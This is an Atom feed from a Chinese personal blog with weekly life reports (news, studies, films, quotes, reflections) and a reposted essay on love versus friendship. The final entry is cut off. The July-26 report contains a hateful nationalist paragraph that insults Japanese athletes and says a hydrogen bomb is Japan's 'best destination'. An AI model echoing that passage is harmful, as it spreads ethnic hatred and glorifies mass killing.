<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M@tr1xの日常</title>
  
  
  <link href="https://www.blog.hackerjerry.top/atom.xml" rel="self"/>
  
  <link href="https://www.blog.hackerjerry.top/"/>
  <updated>2021-11-14T09:10:37.660Z</updated>
  <id>https://www.blog.hackerjerry.top/</id>
  
  <author>
    <name>M@tr1x</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>生活周报-Sep-20-to-Oct-1</title>
    <link href="https://www.blog.hackerjerry.top/2021/10/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/10/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1_new/</id>
    <published>2021-10-01T13:15:56.000Z</published>
    <updated>2021-11-14T09:10:37.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>国庆节，中华人民共和国成立 72 周年。</li><li>中国科学家首次实现人工合成淀粉。</li><li>天宫一号空间站宇航员顺利返航。</li><li>中秋奇妙游&amp;大湾区晚会</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1-1.png#clientId=ubcd8be0e-4640-4&from=paste&id=udcd87ec5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=720&originalType=url%E2%88%B6=1&size=638485&status=done&style=none&taskId=u35cbbdff-72ce-4295-82b3-0084c448f82" alt="image.png"></p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>我们的征途是星辰大海！</li></ol><p>生活的点滴记录</p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>星际穿越</li><li>肖申克的救赎</li><li>守望者</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>又学了哪些新知识?</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>关于人生，关于体验</p><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Sep-20-to-Oct-1-2.png#clientId=ubcd8be0e-4640-4&from=paste&id=u046c5556&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=720&originalType=url%E2%88%B6=1&size=536258&status=done&style=none&taskId=ua24e7d67-e0f5-49d7-a7c4-53f92f6a0a0" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;国庆节，中华人民共和国成立 72 周年。&lt;/li&gt;
&lt;li&gt;中国科学家首次实现人工合成淀粉。&lt;/li&gt;
&lt;li&gt;天宫一号空间站宇</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>【转载】爱情和友情的区别是什么</title>
    <link href="https://www.blog.hackerjerry.top/2021/08/21/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%88%B1%E6%83%85%E5%92%8C%E5%8F%8B%E6%83%85%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/08/21/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%88%B1%E6%83%85%E5%92%8C%E5%8F%8B%E6%83%85%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88_new/</id>
    <published>2021-08-21T08:52:52.000Z</published>
    <updated>2021-11-14T09:11:11.744Z</updated>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: [知乎]<br>index_img: “<a href="https://image.hackerjerry.top/dddd-4.jpg&quot;">https://image.hackerjerry.top/dddd-4.jpg&quot;</a><br>​</p><hr><p>那夜我看到了你的忧虑与顾忌，我虽察觉到你的问题所在，但忍住没说，因为这是一个值得慎重考虑的话题，我希望能更慎重地给你建议，所以采用了文字的方式来回应你，可能你不能一下子理解我在说什么，但文字的好处就在于它能被留下，这些道理现在你不懂没关系，记住它，总有一天用得上。</p><p><strong>（一）你不必感到羞愧，因为那不是爱情</strong><br>你和我说你现在同时在接触好几个女生，总有一种罪恶感，搞得自己好像很花心。<br>​</p><p>我问你你和那些女生都聊些什么？你告诉我只是聊她们和你的交集，骑车、话剧、动漫、音乐、哲学。。。<br>她们总有一个闪光点让你想要靠近。</p><p>我又问你那还拓展出来聊别的不？你和我说：不会，怕浪费时间，有些东西估计和她们聊她们估计也不懂，我只和她们聊她们懂的东西。<br>​</p><p>你看，你觉得聊聊大家都感兴趣的东西就挺好，也没想着进一步发展，动机这么纯，怎么是爱情？<br>​</p><p>其他男生都是靠共同话题打开其他话题，然后进入到情感话题把对方攻陷了，他们就是带着这种把女生把到手的目的去和女生聊天的。<br>​</p><p>人家那叫谈恋爱，你这叫谈兴趣。<br>​</p><p>和别人聊聊兴趣爱好，这和 ta 的性别有关系吗？难道你和男同学聊 Dota 就是为了和他们搅基吗？我想不是吧。<br>​</p><p>多几个朋友聊天，哪怕是女生，又有什么关系。<br>​</p><p>你只是想把自己关于这个兴趣上感受到的快乐分享给更多人，你何必感到羞愧呢？<br><strong>（二）有些事，能完成它的并不只有爱情</strong><br>你和我说，有时候真希望能找一个女生，倾吐所有自己对这个世界的困惑和社会的忧愁。<br>​</p><p>我问你为什么不和我说，不和其他的朋友说。<br>​</p><p>你告诉我：“这些事情太沉重，不希望你们担心”。<br>​</p><p>你为何要这么善良，善良到只愿与我们分享你的快乐，却把悲伤全留给自己。<br>​</p><p>我见过你为了友谊舍付出了那么多，为何你不愿别人在你伤痛的时候也帮帮你？<br>​</p><p>你总说你自己能解决，需要的是一些反思的时间。<br>​</p><p>你那么自私，自私到不愿分我们一丁点痛苦。<br>​</p><p>你觉得爱情是自私的，所以允许你自私一点，去诉说那些困扰了你很久的心事。<br>​</p><p>你都不愿我们去承受那些伤痛，你怎么忍心让一个爱你的女孩去承受这些？<br>​</p><p>爱是为了甜蜜，不是为了苦涩。<br>​</p><p>同甘共苦，并不是仅仅只有爱情能做到，友情也能！<br>​</p><p>我就在这里，我可以愿意听你述说你内心的忧愁，哪怕我不能帮你解决它，说出来总也能减轻一些压力。<br><strong>（三）我所理解的爱情</strong><br>你不是也读过《爱的艺术》么？爱是积极关心和帮助对方成长。<br>​</p><p>但现在有多少情侣，打情骂俏、总想着出去看电影、吃饭，有事没事都腻在一起，不断压缩着独处的时间，压缩着自我成长的时间。<br>​</p><p>等他们腻了，倦了，分了。剩下什么？用最宝贵的青春去交换所谓的甜蜜回忆，可再甜蜜也抵不过现实的残酷啊！<br>​</p><p>我只希望他们多年后不要咒骂，咒骂对方在自己最该努力的时间，让自己沉迷于甜蜜而忘了去努力。<br>​</p><p>当然我身边也有些好例子，他们在一起做得最多的事情就是一起自习。有的男生本来不怎么爱学习，可在女朋友的督促下也常常去自习室。有的女生本来不爱运动，在男朋友的带动下也经常去夜跑。他们从未要求对方要带自己去外面吃饭、看电影，只是晚饭后牵着对方的手，在启真湖畔散散步，聊聊天。没话聊了就回自习室自习。<br>谈这么一场“无聊”的恋爱，不也挺好的么？<br>​</p><p>你肯定要喷我一点激情也没有，但谁说爱一定要炽热？<br>​</p><p>爱情不是沸腾你体内的多巴胺，虽然你曾和我说一年前那种心跳不止的心情，可又能持续多久呢？你不怕得心脏病？<br>​</p><p>别整天幻想着那些无聊青春剧的情节了，真正的爱情一定平淡无奇，但那份平淡里所蕴含的力量，不是那些炽热而短暂的烈火能比的。<br>​</p><p>记住：你不是为了去寻找刺激而去恋爱，而是为了给心找一个归宿。让躁动的心平静下来。<br>​</p><p>你是一个聪明但急躁的人，急躁的人做不成大事。<br>​</p><p>愿你能找到一个包容又智慧的姑娘，静静你那躁动的心。让你能好好沉淀，慢一些，反而会成功得快一些。<br><strong>（四）爱情是互补，友情是共鸣</strong><br>你肯定想问我，那要怎么去找一份真爱，我知道你对自己有一定的了解，那就去找那个与自己互补的人。<br>​</p><p>我并不是说你要去找一个和你观点不同的人，整天争来争去补充自己的观点。<br>​</p><p>相反，互补需要两个人的核心价值观相同，且明白自己的优势与弱势，用自己的优势去弥补对方的劣势，用对方<br>的优势弥补自己的劣势。<br>​</p><p>这样的两个人不会争吵，因为他们不在乎生活里的小摩擦。而且更相信对方，因为他们知道在共同面对一个困难<br>时，该听谁的主意。<br>​</p><p>有人说爱是包容对方所有的缺点，我想有一定道理，但不完全正确，我觉得应该改成爱是接受对方所有的缺点，并努力帮 ta 改掉这些缺点。<br>​</p><p>因为包容解决不了问题，你可能不会爱 ta 一辈子，你所能做的只是帮助 ta，帮助 ta 变得更独立，变得越来越不需要依赖你。<br>​</p><p>或许多年后 ta 身边站着的不是你，但我相信 ta 在心里一直感谢你。<br>​</p><p>有时候你遇到一个她，她似乎就是一个另一个性别的你，她喜欢你所有喜欢的东西，她理解你的一切，和她在一起你是那么的开心。<br>​</p><p>那种开心冲昏了你的头脑，让你误认为那是爱情。<br>有好多人就是这样走在了一起。<br>​</p><p>可两个兴趣点完全相同的人如果腻在一起，总有一天会无聊的，因为他们知道对方在想什么，他们需要一些新意。<br>​</p><p>这种感情应该成为友情，你不要奢望对方给你的太多，在一起时能产生共鸣的快乐，就够了，别那么自私地想占有对方的全部。<br>​</p><p>我不反对你以后心里装着好几个女性朋友，但你以后心里一定只能有一个女朋友，别错把友情当爱情。</p><p><strong>（五）是男人就要耐得住寂寞</strong><br>你现在虽然单身，但千万不要因为寂寞而去找另一半，不断丰富自己，不断认识自己，总有一天你会遇到与你互补的她。<br>​</p><p>而且你有着那么多可以做的事情，你对那么多东西感兴趣，你又喜欢书写自己的故事。<br>​</p><p>那就好好去感受吧，生活就是你最好的素材，在生命中感受最敏感的时刻好好去感受这个世界，然后用你的文字留住自己的经历和感受。<br>​</p><p>虽然写作时我们常常是寂寞的，但如果耐不住这份寂寞，多年后我们又怎么能回味到这文字里的那些酸甜苦辣。<br>耐得住寂寞的人才能等得到真爱。<br>​</p><p>祝早日找到适合你的她。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;tags: []&lt;br&gt;categories: [知乎]&lt;br&gt;index_img: “&lt;a href=&quot;https://image.hackerjerry.top/dddd-4.jpg&amp;quot;&quot;&gt;https://image.hackerjerry.top/dddd-4</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-Aug-9-to-15</title>
    <link href="https://www.blog.hackerjerry.top/2021/08/16/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/08/16/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15_new/</id>
    <published>2021-08-16T01:52:16.000Z</published>
    <updated>2021-11-14T09:11:41.056Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>霍尊被锤</li><li>河南《七夕奇妙游》</li><li>阿里女员工被侵犯一案结束</li><li>阿富汗塔利班上台，原总统辞职</li><li>英国药检阳性，中国有望获得 4*100 铜牌递补，实现 0 的飞跃</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li><del>中科大联系不到尚有名额的导师，很烦。</del>老师主动发邮件联系了。。</li><li>终于把那颗蛀牙拔了，心头之患-1。</li><li><del>上交网安夏令营凉了</del>，我好伤心……去上海这两趟可是花了我 4000 大洋啊啊啊啊啊，<del>为啥不发 waiting list 了呜呜呜。</del>上帝啊，我和上交真的是无缘了吗……我哭了……（虚惊一场，拿到了）</li><li>求求老天让孩子快点拿到一个满意的 offer 吧，孩子努力了这么久也应该有回报了吧。（感谢上帝，感谢先人）</li><li>小悟空，助我一臂之力！</li></ol><p>​</p><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15-1.jpeg#clientId=u3431b4c3-085a-4&from=drop&id=ua2273602&margin=%5Bobject%20Object%5D&name=mmexport1628330008465.jpg&originHeight=720&originWidth=720&originalType=binary%E2%88%B6=1&size=310277&status=done&style=none&taskId=u238c0330-b874-483d-b854-27565f104ce" alt="mmexport1628330008465.jpg"></p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>Graph Attention Network 的本质是什么？</li><li>验证码在黑灰产对抗中的角色和实践</li><li>如何优雅的向导师表示这周科研没什么进展？</li><li>WAF 攻防实践</li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>扫黑风暴</li><li>瑞克和莫蒂第五季</li><li>大护法</li><li>日剧《班会》–日本真的是个变态的国家</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>除了书本学问，人生处处是学问。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>并查集、双指针、滑动窗口</li><li>贪心</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>做重要决定之前，一定要三思！三思！写到纸上优劣情况再做决定，还要和家人商量！</li></ol><p>​</p><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-Aug-9-to-15-2.jpeg#clientId=uc4ad01ba-c4cc-4&from=drop&id=u616628f2&margin=%5Bobject%20Object%5D&name=1630914702089.jpg&originHeight=588&originWidth=640&originalType=binary%E2%88%B6=1&size=222007&status=done&style=none&taskId=u9f6a41b7-180f-4452-9edd-d83e64b51b8" alt="1630914702089.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;霍尊被锤&lt;/li&gt;
&lt;li&gt;河南《七夕奇妙游》&lt;/li&gt;
&lt;li&gt;阿里女员工被侵犯一案结束&lt;/li&gt;
&lt;li&gt;阿富汗塔利班上台，</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-July-26</title>
    <link href="https://www.blog.hackerjerry.top/2021/07/27/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/07/27/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26_new/</id>
    <published>2021-07-27T02:46:10.000Z</published>
    <updated>2021-11-14T09:18:27.272Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-1.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=x0Rv5&margin=%5Bobject%20Object%5D&name=1627386698527.jpg&originHeight=1080&originWidth=1080&originalType=binary%E2%88%B6=1&size=743632&status=done&style=none&taskId=u0f0c91fc-4453-4681-bdc3-66c1f2d3869" alt="1627386698527.jpg"></p><h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>南京突发疫情，传染源为德尔塔新冠病毒，已经蔓延到 7 省</li><li>鸿星尔克捐款 5000 万，直播间被网友挤爆，野性消费，线下店亦是被一扫而空</li><li>东京奥运会阴间开幕式，真是污染眼睛</li><li>台风烟花登陆浙江，可能会二次登陆上海</li><li>奥运会首金是清华大三杨倩获得，27 日杨倩又获得一枚混合团体金牌</li><li>许昕刘诗雯混双不敌日本队，获得银牌</li><li>水谷隼吹球，伊藤美诚摸桌子，裁判装作无视</li><li>马龙成功双圈大满贯，获得男单金牌</li><li>张雨霏获得两金两银，其中女子 4*200 打破世界纪录</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>我愈发的对日本的整个国家和民族产生深深的厌恶之情。从奥运会开幕式可以看出，这个影视剧里美好静谧的国家，其实早已是金玉其外，败絮其中。组织低效，贪污腐败，推脱甩锅，随便开除，鞠躬致歉，好一个顾小节而无大义的日本啊。只是因为资金问题就可以把核废水排进太平洋，你们的美国爸爸呢？现在去哪里了？反手就禁止海产品进口，双标的不要不要。再看运动会赛程，乒乓球不按照国际乒联的规定，将场地缩小，刻意添加规则限制中国队，水谷隼犯规裁判视而不见，许昕吹球就直接黄牌，赤裸裸的恶心人。再说那个伊藤美诚，表情丰富，眼神里透出狠毒，赢了球和小人得志一般。从日本展示出来的，从首相，到大臣，再到运动员、裁判，众多的普通人，日本早已不是那个借着美国东风腾飞的亚洲四小龙了，内部腐朽不堪，摇摇欲坠。如今的日本，赌输了国运，那么只有每况愈下的唯一结局了，我只希望它不要让日本军国主义复辟，再宁为玉碎不为瓦全拉全人类给它陪葬。说到底，氢弹就是日本最好的归宿，那火红的，明亮的太阳照耀着日本，将无穷的热量洒向每一寸土地，就像它们的国旗。</li><li>去上海这几天，饭根本就没吃好，掉了三斤肉，唉。</li><li>c 楼大爷说什么要清书，我们这些天真的，遵守规则的大学生就乖乖的把书都搬回了宿舍。然后呢？第二天一大早就开门了，您清了什么书？您打扫了什么卫生？就是让我们把腾出来的座位拱手相让？看不懂，但我大受震撼。</li><li>打了新冠疫苗第一针，之前网上说的不良反应倒是没有遇见，甚至连困都不困，生龙活虎。</li><li>回来之后颓废了两天，意志力极度低沉，完全不想做任何与学习有关的事情，光刷手机、看视频，在宿舍窝着，把生活过的一团糟。我是谁，我在哪？</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-2.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=YNCpg&margin=%5Bobject%20Object%5D&name=1627386609392.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=601783&status=done&style=none&taskId=u41bff44e-d3b7-456b-bbf1-080d74ed71b" alt="1627386609392.jpg"></p><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li><a href="https://mp.weixin.qq.com/s/uJmq_6uS9-FbLT1Mzpq7Aw">PPT 字效高端修改操作</a></li><li><a href="https://mp.weixin.qq.com/s/AT2NV6NQAZeM2I_TMgEyuQ">Redis 常见漏洞利用方法总结</a></li><li>字节实习面经</li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li><strong>洛基 1-6</strong></li></ol><p>感觉美剧版洛基有点搞笑<br>神圣时间线，TVA，多元宇宙，yysy，美国的特效做的真不错。</p><ol start="2"><li><strong>2008 年北京奥运会开幕会</strong></li></ol><p>重看了 2008 年的北京奥运会开幕式，真的 10 年后看，仍然震撼。史上最好，美轮美奂，东方大国，我难以用语言形容这场宏大的奥运开幕式，只能说它，无可挑剔。从 56 个民族的小朋友托举着五星红旗交给仪仗队，再到红旗冉冉升起，祝福我们亲爱的祖国，从今走向繁荣富强。<br>中国的宏大，包容，和谐，历史悠长被每一个节目表现得淋漓尽致。<br>中国红，永远是世界上最耀眼的那抹颜色。<br>当我回念往昔，会永远记得 08 年那个夏天，北京奥运会给我们的感动和力量。<br>试看未来的寰宇，必将是赤旗的世界！</p><ol start="3"><li><strong>魔女宅急便</strong></li></ol><p>这是一部宫崎骏的电影，这么多年我还只看过千与千寻和龙猫，所以现在准备补一下（其实是看到某人的头像于是想看一看的）<br>小魔女的成长历程，画风很温馨，城市生活很真实。这一路上她经历了许多历练，暴雨、闯祸、住不了旅馆、不受人待见、送货出错、失去魔法、听不懂黑猫说话等等，但是琪琪没有退缩，还用一颗美好的善良的心去对待身边的所有人，她从这些经历中获得成长，也给我们启迪：“<strong>所有的成长，都是用未经世事的纯真作为代价</strong>。”<br>琪琪是一个独立的小魔女，整部片子传达出的价值观十分适合让小孩子观看。<br>（琪琪去的那座城市，除了风格是欧式的，其他的元素像是红瓦绿树、碧海蓝天，简直就是青岛好嘛 2333）<br>​</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><h3 id="变的更好的标志"><a href="#变的更好的标志" class="headerlink" title="变的更好的标志"></a>变的更好的标志</h3><ol><li><strong>重视自己的健康和快乐</strong></li></ol><p>认真锻炼，坚持体检。每天坚持做一些运动，不断增强自己的免疫力。明白熬夜的坏处，开启规律的作息，不再放纵自己，早早进入甜甜的梦乡。</p><ol start="2"><li><strong>做事积极且自律</strong></li></ol><p>不要被懒惰控制，不要再荒废时光，去钻研有意思的领域，不断提升自己的实力和才华。读书、考证，练书法、学口语，你感兴趣的技能，都可以去尝试。</p><ol start="3"><li><strong>保持干净的气质</strong></li></ol><p>把家里打扫得干干净净、收拾得井井有条，自会福气满满。<br>每周末的时候进行一次大扫除，洗洗床单、换换被罩、晒晒被子。</p><ol start="4"><li><strong>拥有治愈自己的能力</strong></li></ol><p>沮丧低落的时候，能够与自己和解。太累了，记得和自己说一句辛苦了，送自己一点惊喜，告诉自己，坚持下去，你会遇见更多奇妙的景色。</p><ol start="5"><li><strong>懂得控制自己的情绪</strong></li></ol><p>遇到工作难题，既然开心与否都要去做，不如开开心心想办法解决。不传播负面情绪，更不要喋喋不休地抱怨，放宽心，保持乐观。<br>对待家人，更要有个好脾气，不要随意发火，别说伤感情的话，少一点职责，多一点将心比心。</p><ol start="6"><li><strong>心里始终装着善良和温柔</strong></li></ol><p>人活一辈子，要对得起自己的良心，扛起自己的责任，有一份光发一份光，有一份热发一份热。<br>正所谓“爱出者爱返，福往者福来”，怀揣着善意、始终向着光明的你，一定会有更多好运气。</p><h3 id="摆脱油腻"><a href="#摆脱油腻" class="headerlink" title="摆脱油腻"></a>摆脱油腻</h3><p>中年以后，让人变得油腻的，不仅仅是发福的身材和复杂的圈子，更是思想上的贫瘠和学习上的自我放纵。<br>古训有言“人不学，则尘俗生其间，照镜面目可憎，对人语言无味。”<br>再老的人，只要保持着运动、学习的习惯，不那么爱刷存在感，节制干净，都不会有油腻的感觉。<br>​</p><h3 id="走向成熟"><a href="#走向成熟" class="headerlink" title="走向成熟"></a>走向成熟</h3><p>“九牛一毫莫自夸，骄傲自满必翻车”<br>一个人只有放低自己的位置，才能认识到自己的不足，进一步精进自己。<br>技艺的真正秘诀，是要永远当一个初学者。<br>放低自己的位置，不是自卑，不是怯懦，而是一个走向成熟的标志。</p><h3 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h3><ol><li>我曾将青春还给了她，连同指尖弹出的盛夏。</li><li>不要担心老之将至，你老了也一定很可爱。</li><li>“我太文化沙漠了”“没关系，沙漠里也有红柳、胡桃”</li><li>谢谢你的突然出现给我的生活带来了一段特别有意义的日子，祝你平安。</li><li><strong>我本身就是一个不喜欢主动的人，虽然灵魂有趣，但不爱表达。死倔，也慢热，遇到懂我的人是幸运，遇不到也是正常。沉默、喜欢独处、三观正，比你想象的深情，也比你认为的冷漠。</strong></li><li>不要叫我单身狗，我是闪电干饭狼，别拿青春倒插秧，爱情哪有干饭香。</li><li>“请在合适的位置掉头”</li><li>祝你们信念生根，但灵魂自在，往后人生道路宽广，途径的每一个夏天，都草木葱茏，满目生机。</li><li>生活再糟，也不妨碍你越来越好。</li><li>人生三大错觉，一定一定不要自我感觉良好，一定不要高估别人对你的评价，一定一定不要自取其辱！</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>复习了一些</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="自律-意志力"><a href="#自律-意志力" class="headerlink" title="自律|意志力"></a>自律|意志力</h3><ol><li><strong>自律就是每天 11 点半准时睡觉，六点 45 准时起床，每天按时去健身，每顿饭不碰手机专心吃饭，控制住自己的欲望，把精力投入到可以提升你的未来的事情当中。</strong></li><li>真正有价值的事情都不是轻松舒服就能完成的，那些晨间的寂静，不眠的星光，清醒的克制，孤军奋战的坚持，才是我们意志闪光的时刻。</li><li>单调的攀登动作会感到厌烦，但每一步都更接近顶峰。</li><li>训练意志力：1.<strong>把事情贯彻到底</strong>。属于自我认知–完成胜过完美。2. <strong>不管花多少时间，把事情做好</strong>。属于自我改善–学习钻研和反省总结。3.<strong>做的比你能做的更好</strong>。属于自我超越–在细节上，每天努力一点点。</li></ol><h3 id="做人"><a href="#做人" class="headerlink" title="做人"></a>做人</h3><ol><li>如果你是个过来人，请不要给正在进行的人泼冷水，即使你在这件事上有发言权，也不要觉得他们做的都是小菜一碟。只要一个人在用心地认真地做一件事，不管这件事在你看来多渺小多轻而易举，都值得真心去鼓励。</li><li>温柔不是懦弱，温柔是一种巨人的力量。一个温柔的人，他不轻易发脾气，不容易失望，他愿意友好对待每一个人。即使他的知识层面和储备都远高于你，仍愿意俯下身来听你说生活的琐碎。他们明亮而不刺眼，自信满满又懂得收敛。</li><li>“你太厉害了，连这个都知道。”“我只是比你早一点知道而已，现在你不也知道了。”</li><li>真正的情商高不是圆滑客套，而是温暖真诚，懂得换位思考，让人如沐春风百处不厌。</li><li>我不知道未来我会遇到什么样的人，但我可以肯定的是，无论以后我遇到什么人，她都同样渴望着我优秀。所以我不需要浪费大量时间去回忆过去和幻想未来。我需要的是把所有的时间用来完善自己。只为了遇见你，然后对你说“我知道你很好，但我也不差。”</li><li>三观是用来约束自己而不是用来审视别人的，道德同理。礼义廉耻，可以律己，不可以绳人。</li><li><strong>保持自己的思想和态度的整洁，让生活事事条理清楚且远离拖沓</strong>。</li><li>“及时止损”辞去不合适的工作，退出不合群的圈子，告别不合适的感情，离开不合适的人，<strong>不要过度怀念沉没成本</strong>。</li><li>大家都是有骨气的人，互相讨厌也没关系。</li><li>遇贵人先立业，遇良人先成家，无贵人而自立，无良人而自修，<strong>无能遇贵人无用，无钱遇良人无缘。</strong></li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-3.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u1db02c38&margin=%5Bobject%20Object%5D&name=1627384861858.jpg&originHeight=1135&originWidth=1046&originalType=binary%E2%88%B6=1&size=277784&status=done&style=none&taskId=u80897df3-34ae-4332-9203-ea1eac25005" alt="1627384861858.jpg"></p><h4 id="不要说"><a href="#不要说" class="headerlink" title="不要说"></a>不要说</h4><ol><li>批评别人喜欢的东西，并不会让别人讨厌这个东西，只会让人讨厌你。</li><li>“这都不知道？”“这都没见过？”“这都没听过？”“不是吧？”</li></ol><h3 id="学习-读书"><a href="#学习-读书" class="headerlink" title="学习|读书"></a>学习|读书</h3><ol><li>读书不光是为了学习知识，更重要的是，学会思考，学会考虑事情之间的逻辑。</li><li>走出去，去经历更大的世界，去不断遇到自己的极限，然后去尝试突破它，突破再突破，当有一天回过头来看的时候，自己已经走出了从未想象想过的前途。</li><li>你可以假装不行，但你不能真不行。</li></ol><h3 id="人生的意义"><a href="#人生的意义" class="headerlink" title="人生的意义"></a>人生的意义</h3><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-4.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u7f9f5733&margin=%5Bobject%20Object%5D&name=1627384921569.jpg&originHeight=778&originWidth=800&originalType=binary%E2%88%B6=1&size=103876&status=done&style=none&taskId=u60ae5f96-ff82-4e08-83c7-3285d4e3487" alt="1627384921569.jpg"><br><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-5.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u1c1eac39&margin=%5Bobject%20Object%5D&name=1627386350439.jpg&originHeight=1494&originWidth=1080&originalType=binary%E2%88%B6=1&size=399177&status=done&style=none&taskId=u576adb8e-d4fa-4594-9415-4a7800524bb" alt="1627386350439.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-26-1.jpeg#clientId=u1f8968b0-1af6-4&amp;from=drop&amp;id=x0Rv5&amp;</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-July-14-to-21</title>
    <link href="https://www.blog.hackerjerry.top/2021/07/21/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-14-to-21_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/07/21/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-14-to-21_new/</id>
    <published>2021-07-21T11:33:09.000Z</published>
    <updated>2021-11-14T09:10:29.180Z</updated>
    
